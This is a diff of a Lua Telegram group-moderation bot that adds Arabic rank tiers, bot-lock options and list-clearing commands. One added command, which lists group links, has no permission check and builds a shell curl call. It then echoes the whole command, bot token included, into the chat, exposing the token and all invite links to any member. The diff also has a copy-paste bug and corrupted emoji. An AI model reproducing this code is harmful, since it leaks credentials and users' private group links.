+                    elseif is_monsh(result.id_, msg.chat_id_) then
+                    t = 'منشئ الكروب'
+                    elseif is_onall(result.id_) then
+                    t = 'مدير عام'
+                    elseif is_moall(result.id_) then
+                     t = 'ادمن عام'
+                     elseif is_vpall(result.id_) then
+                     t = 'مميز عام'
+                     elseif is_donky(result.id_, msg.chat_id_) then
+                    t = 'مطي محمل طحين 😹😔'
                   elseif is_owner(result.id_, msg.chat_id_) then
                     t = 'مدير البوت'
                   elseif is_momod(result.id_, msg.chat_id_) then
@@ -4466,6 +5377,16 @@ if is_sudo(msg) then
 t = 'مطور اساسي 🍷'
 elseif is_admin(msg.sender_user_id_) then
 t = 'مطور فالرتبه الثالثه 🚩'
+elseif is_onall(msg.sender_user_id_) then
+t = 'مدير عام 🚩'
+elseif is_moall(msg.sender_user_id_) then
+t = 'ادمن عام 🚩'
+elseif is_vpall(msg.sender_user_id_) then
+t = 'مميز عام🚩'
+elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
+t = 'منشئ الكروب 💷'
+elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
+t = 'مطي معدل 😹💔'
 elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
 t = 'مدير البوت 💷'
 elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
@@ -4801,6 +5722,12 @@ end
               tar = 'المطور ✨'
             elseif is_admin(msg.sender_user_id_) then
               tar = 'المطور ✨'
+              elseif is_onall(msg.sender_user_id_) then
+              tar = 'المدير ✨'
+              elseif is_moall(msg.sender_user_id_) then
+              tar = 'الادمن ✨'
+              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
+              tar = 'المنشئ ✨'
             elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
               tar = 'المدير ✨'
             elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
@@ -4843,19 +5770,53 @@ end
               end
             end
             if lockpt[2] == "bots" or lockptf[2] == "البوتات" then
-              if not database:get('bot:bots:ban'..msg.chat_id_) then
+              if not database:get('bot:bots:mute'..msg.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots ☑️', 1, 'md')
                 else
                   local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
             faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                 end
-                database:set('bot:bots:ban'..msg.chat_id_,true)
+                database:set('bot:bots:mute'..msg.chat_id_,true)
               else
                 if database:get('lang:gp:'..msg.chat_id_) then
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked ✔️', 1, 'md')
                 else
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات سابقا ✔️', 1, 'md')
+                end
+              end
+            end
+            if lockpt[2] == "bots ban" or lockptf[2] == "البوتات بالطرد" then
+              if not database:get('bot:bots:ban'..msg.chat_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots ban ☑️', 1, 'md')
+                else
+                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات بالطرد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 64, string.len(msg.sender_user_id_))
+                end
+                database:set('bot:bots:ban'..msg.chat_id_,true)
+              else
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked ban ✔️', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات بالطرد سابقا ✔️', 1, 'md')
+                end
+              end
+            end
+            if lockpt[2] == "bots keed" or lockptf[2] == "البوتات بالتقييد" then
+              if not database:get('keed_bots'..msg.chat_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots keed ☑️', 1, 'md')
+                else
+                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات بالتقييد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 66, string.len(msg.sender_user_id_))
+                end
+                database:set('keed_bots'..msg.chat_id_,true)
+              else
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked keed ✔️', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات بالتقييد سابقا ✔️', 1, 'md')
                 end
               end
             end
@@ -4922,7 +5883,7 @@ end
             if status[2] == "kick" or status[2] == "بالطرد" then
               if database:get('floodstatus'..msg.chat_id_) == "Kicked" then
                 if database:get('lang:gp:'..msg.chat_id_) then
-                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status is *already* on Kicked ', 1, 'md')
+                  faederdx(msg.chat_id_, msg.id_, 1, '??⁞ Flood status is *already* on Kicked ', 1, 'md')
                 else
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالطرد فعلا 🚏', 1, 'md')
                 end
@@ -5373,6 +6334,12 @@ end
               tar = 'المطور ✨'
             elseif is_admin(msg.sender_user_id_) then
               tar = 'المطور ✨'
+              elseif is_onall(msg.sender_user_id_) then
+              tar = 'المدير ✨'
+              elseif is_moall(msg.sender_user_id_) then
+              tar = 'الادمن ✨'
+              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
+              tar = 'المنشئ ✨'
             elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
               tar = 'المدير ✨'
             elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
@@ -5427,6 +6394,40 @@ end
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked ✔️', 1, 'md')
                 else
                   faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات سابقا ✔️', 1, 'md')
+                end
+              end
+            end
+            if unlockpt[2] == "bots ban" or unlockpts[2] == "البوتات بالطرد" then
+              if database:get('bot:bots:ban'..msg.chat_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots ban☑️', 1, 'md')
+                else
+                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات بالطرد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 64, string.len(msg.sender_user_id_))
+                end
+                database:del('bot:bots:ban'..msg.chat_id_)
+              else
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked ban ✔️', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات بالطرد سابقا ✔️', 1, 'md')
+                end
+              end
+            end
+            if unlockpt[2] == "bots keed" or unlockpts[2] == "البوتات بالتقييد" then
+              if database:get('keed_bots'..msg.chat_id_) then
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock bots keed ☑️', 1, 'md')
+                else
+                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح البوتات بالتقييد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 66, string.len(msg.sender_user_id_))
+                end
+                database:del('keed_bots'..msg.chat_id_)
+              else
+                if database:get('lang:gp:'..msg.chat_id_) then
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already unlocked keed ✔️', 1, 'md')
+                else
+                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح البوتات بالتقييد سابقا ✔️', 1, 'md')
                 end
               end
             end
@@ -5503,6 +6504,12 @@ end
               tar = 'المطور ✨'
             elseif is_admin(msg.sender_user_id_) then
               tar = 'المطور ✨'
+              elseif is_onall(msg.sender_user_id_) then
+              tar = 'المدير ✨'
+              elseif is_moall(msg.sender_user_id_) then
+              tar = 'الادمن ✨'
+              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
+              tar = 'المنشئ ✨'
             elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
               tar = 'المدير ✨'
             elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
@@ -5912,6 +6919,12 @@ end
               tar = 'المطور ✨'
             elseif is_admin(msg.sender_user_id_) then
               tar = 'المطور ✨'
+              elseif is_onall(msg.sender_user_id_) then
+              tar = 'المدير ✨'
+              elseif is_moall(msg.sender_user_id_) then
+              tar = 'الادمن ✨'
+              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
+              tar = 'المنشئ ✨'
             elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
               tar = 'المدير ✨'
             elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
@@ -6319,7 +7332,7 @@ end
               if database:get('lang:gp:'..msg.chat_id_) then
                 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Enter a number greater than 40 •', 1, 'md')
               else
-                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اختر عدد اكبر من 40 حرف •', 1, 'md')
+                faederdx(msg.chat_id_, msg.id_, 1, '??⁞ اختر عدد اكبر من 40 حرف •', 1, 'md')
               end
             else
               database:set('bot:sens:spam'..msg.chat_id_,sensspam[2])
@@ -6418,14 +7431,14 @@ end
               end
               database:del('bot:momod:'..msg.chat_id_)
             end
-            if txt[2] == 'owners' or txts[2] == 'المدراء' then
+            if txt[2] == 'donky list' or txts[2] == 'المطايه' then
               if database:get('lang:gp:'..msg.chat_id_) then
                 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
               else
-                local faeder = '🚦⁞ تم مسح المدراء • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+                local faeder = '🚦⁞ تم مسح المطايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
             faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 34, string.len(msg.sender_user_id_))
               end
-              database:del('bot:owners:'..msg.chat_id_)
+              database:del('bot:donky:'..msg.chat_id_)
             end
             if txt[2] == 'voplist' or txts[2] == 'الاعضاء المميزين' then
               if database:get('lang:gp:'..msg.chat_id_) then
@@ -6446,16 +7459,6 @@ end
             faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 38, string.len(msg.sender_user_id_))
               end
             end
-            if txt[2] == 'Filter all list' or txts[2] == 'قائمه المنع العام' then
-              local hash = 'bot:freewords:'
-              database:del(hash)
-              if database:get('lang:gp:'..msg.chat_id_) then
-                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Freelist has been cleared •', 1, 'md')
-              else
-                local faeder = '🚦⁞ تم مسح قائمه المنع العام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
-            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 44, string.len(msg.sender_user_id_))
-              end
-            end
             if txt[2] == 'mutelist' or txts[2] == 'المكتومين' then
               database:del('bot:muted:'..msg.chat_id_)
               if database:get('lang:gp:'..msg.chat_id_) then
@@ -6467,6 +7470,67 @@ end
             end
           end
         end
+        if is_admin(msg.sender_user_id_, msg.chat_id_) then
+          if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") then
+            local txt = {string.match(text, "^([Cc]lean) (.*)$")}
+            local txts = {string.match(text, "^(مسح) (.*)$")}
+            if txt[2] == 'Filter all list' or txts[2] == 'قائمه المنع العام' then
+              local hash = 'bot:freewords:'
+              database:del(hash)
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Freelist has been cleared •', 1, 'md')
+              else
+                local faeder = '🚦⁞ تم مسح قائمه المنع العام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 44, string.len(msg.sender_user_id_))
+              end
+            end
+            if txt[2] == 'owners' or txts[2] == 'المدراء' then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ owner list has been cleared •', 1, 'md')
+              else
+                local faeder = '🚦⁞ تم مسح المدراء • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 34, string.len(msg.sender_user_id_))
+              end
+              database:del('bot:owners:'..msg.chat_id_)
+            end
+            if txt[2] == 'monsh' or txts[2] == 'المنشئين' then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ monsh list has been cleared •', 1, 'md')
+              else
+                local faeder = '🚦⁞ تم مسح المنشئين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 35, string.len(msg.sender_user_id_))
+              end
+              database:del('bot:monsh:'..msg.chat_id_)
+            end
+            if txt[2] == 'momod all' or txts[2] == 'الادمنيه العامين' then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod all list has been cleared •', 1, 'md')
+              else
+                local faeder = '🚦⁞ تم مسح الادمنيه العامين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 43, string.len(msg.sender_user_id_))
+              end
+              database:del('bot:moall:')
+            end
+            if txt[2] == 'vip all' or txts[2] == 'المميزين عام' then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ vip all list has been cleared •', 1, 'md')
+              else
+                local faeder = '🚦⁞ تم مسح المميزين عام • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 39, string.len(msg.sender_user_id_))
+              end
+              database:del('bot:owners:'..msg.chat_id_)
+            end
+            if txt[2] == 'ownerall' or txts[2] == 'المدراء العامين' then
+              if database:get('lang:gp:'..msg.chat_id_) then
+                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Mod list has been cleared •', 1, 'md')
+              else
+                local faeder = '🚦⁞ تم مسح المدراء العامين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
+            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 42, string.len(msg.sender_user_id_))
+              end
+              database:del('bot:onall:')
+            end
+            end
+            end
         ------------------------------faeder-----------------------------------------------------------------
         if is_momod(msg.sender_user_id_, msg.chat_id_) then
           if text:match("^[Ss]ettings$") or text:match("^الاعدادات$") then
@@ -6532,7 +7596,7 @@ end
               mute_music = 'معطل 📍'
             end
             ------------faedee
-            if database:get('bot:bots:mute'..msg.chat_id_) then
+            if database:get('bot:bots:ban'..msg.chat_id_) then
               mute_bots = 'مفعل 🚩'
             else
               mute_bots = 'معطل 📍'
@@ -6645,7 +7709,7 @@ end
             if database:get('bot:document:mute'..msg.chat_id_) then
               lock_file = 'مفعل 🚩'
             else
-              lock_file = 'معطل 📍'
+              lock_file = 'معطل ??'
             end
             ------------faeder
             if database:get('markdown:lock'..msg.chat_id_) then
@@ -6927,8 +7991,6 @@ faederdx(msg.chat_id_, msg.id_, 1, '💳⁞ ايدي المجموعه  • '..ms
 end 
 getChannelFull(msg.chat_id_, gpinfo, nil) 
 end
-
-
         --------------------------------faeder--------------------------------------------------------------
 if text == 'تفعيل البوت الخدمي' then 
 local  faeder = '🚦⁞ تم تفعيل البوت الخدمي •'
@@ -6993,11 +8055,23 @@ end
           
         end
         ------------------------------------------faeder-----------------------------------------------------
-        if text:match('^معلومات السيرفر$') and is_sudo(msg) then
-          local s = io.popen("sh ./data.sh")
-          local text = ( s:read("*a") )
-          faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
-        end
+
+        if text:match("^روابط الكروبات$") then
+local gpss = database:smembers("bot:groups") or 0
+local gps = database:scard("bot:groups") 
+text = '🚦⁞ روابط كل كروبات البوت •\n\n'
+for i=1, #gpss do
+local link = database:get("bot:group:link"..gpss[i])
+text = text.."|"..i.."| ~ "..gpss[i].."\n ~ "..(link or  "لا يوجد رابط").."\n"
+end
+ local f = io.open('FAEDER.txt', 'w')
+ f:write(text)
+ f:close()
+ local faeder = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
+ local curl = 'curl "' .. faeder .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'FAEDER.txt' .. '"'
+ io.popen(curl)
+ faederdx(msg.chat_id_, msg.id_, 1, curl, 1, 'md')
+ end
         ------------------------------------faeder----------------------------------------------------------
         if text and text:match("^نشر بالخاص (.*)") and is_leader(msg) then
 if not database:get('lock:add'..msg.chat_id_) then
@@ -7021,7 +8095,8 @@ end
           else
             faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Please *Send* Your Message 🗳 \n🚦⁞ \n For Cancel The Operation, Send Command /Cancel 🗳 ", 1, "md")
           end
-        end end
+        end
+ end
         ----------------------------------------------faeder-------------------------------------------------
         if is_momod(msg.sender_user_id_, msg.chat_id_) then
           if text:match('^مسح (%d+)$') then
@@ -7123,24 +8198,25 @@ end
    🔓*⁞* فتـح «» لفتـح امر ✓
 ┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
 ┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
-   ⚜*⁞* الـروابـط  «» المـعـرف •
-   ⚜*⁞* الـبـوتـات «» الشارحـه •
-   ⚜*⁞* المتحركه «» المـلـفـات •
-   ⚜*⁞* الـصـور   «» الملصقات •
-   ⚜*⁞* الفيـديـو  «» الاونـلايـن • 
-   ⚜*⁞* الدردشـه «» الـتوجـيـه •
-   ⚜*⁞* الاغاني   «» الـصــوت •
-   ⚜*⁞* الجهات   «» الماركداون •
-   ⚜*⁞* العربيه    «» الانكلـيزيه •
-   ⚜*⁞* الحمايه   «» الــتـكـرار •
-   ⚜*⁞* الهاشتاك  «» الـتعديـل •
-   ⚜*⁞* التثبيت   «» الاشعارات •
-   ⚜*⁞* الـكـل      «» الكـلايـش •
-   ⚜*⁞* المواقـع   «» الشبـكات •
-   ⚜*⁞* الاشعارات •           
+   📚*⁞* الـروابـط          «» المـعـرف •
+   📚*⁞* الـبـوتـات         «» الشارحـه •
+   📚*⁞* المتحركه         «» المـلـفـات •
+   📚*⁞* الـصـور            «» الملصقات •
+   📚*⁞* الفيـديـو          «» الاونـلايـن • 
+   📚*⁞* الدردشـه          «» الـتوجـيـه •
+   📚*⁞* الاغاني            «» الـصــوت •
+   📚*⁞* الجهات            «» الماركداون •
+   📚*⁞* العربيه             «» الانكلـيزيه •
+   📚*⁞* الحمايه            «» الــتـكـرار •
+   📚*⁞* الهاشتاك           «» الـتعديـل •
+   📚*⁞* التثبيت            «» الاشعارات •
+   📚*⁞* الـكـل               «» الكـلايـش •
+   📚*⁞* المواقـع            «» الشبـكات •
+   📚*⁞* البوتات بالطرد   «» البوتات بالتقييد •
+   📚*⁞* الاشعارات •           
 ┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
 ┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
- ⚜*⁞* الكل بالساعات + عدد الساعات 
+ 📚*⁞* الكل بالساعات + عدد الساعات 
 ┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
 ]]
                 faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
@@ -7189,8 +8265,11 @@ end
 🗃*⁞* الدعم      «» قائمه المنع •
 🗃*⁞* الردود     «» المحظورين •
 🗃*⁞* المدراء    «» الاعدادات •
-🗃*⁞* الادمنيه   «» الاعضاء المميزين •
-🗃*⁞* المقيدين  «» المكتومين •
+🗃*⁞* الادمنيه   «» المكتومين •
+🗃*⁞* المقيدين  «» الاعضاء المميزين •
+🗃*⁞* المطايه    «»   المميزين عام •
+🗃*⁞* المنشئين  «» المدراء العامين •
+🗃*⁞* الادمنيه العامين •
 
 ┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
 
@@ -7225,6 +8304,7 @@ end
   🗳*⁞* مشاهده المنشور •
   🗳*⁞* ايدي المجموعه •
   🗳*⁞* اسم المجموعه •
+  🗳*⁞* رفع «» تنزيل مطي •
 ┛ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┗
 ┓ـ⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯ـ┏
   📚*⁞* رتبته       + المعرف •
@@ -7287,6 +8367,7 @@ end
   🗳*⁞* جلب الملاحظه •
   🗳*⁞* تنظيف الرسائل •
   🗳*⁞* تنظيف الكروبات •
+  🗳*⁞* روابط الكروبات •
   🗳*⁞* جلب رد الخاص •
   🗳*⁞* حذف رد الخاص •
   🗳*⁞* قائمه العام •
@@ -7297,13 +8378,21 @@ end
   🗃*⁞* تعطيل البوت الخدمي •
 
   🗃*⁞* رفع «» تنزيل مدير •
+  🗃*⁞* رفع «» تنزيل منشئ •
+  🗃*⁞* رفع «» تنزيل مدير عام •
+  🗃*⁞* رفع «» تنزيل ادمن عام •
+  🗃*⁞* رفع «» تنزيل مميز عام •
   🗃*⁞* رفع «» تنزيل مطور رتبه ثالثه •
 
   🗃*⁞* رد الخاص تفعيل «» تعطيل •
   🗃*⁞* المغادره التلقائيه تفعيل «» تعطيل •
  
   📱*⁞* مسح المدراء •
+  📱*⁞* مسح المنشئين •
   📱*⁞* مسح  قائمه العام •
+  📱*⁞* مسح المميزين عام •
+  📱*⁞* مسح المدراء العامين •
+  📱*⁞* مسح الادمنيه العامين •
   📱*⁞* مسح قائمه المنع العام •
   📱*⁞* مسح مطورين الرتبه الثالثه •
 
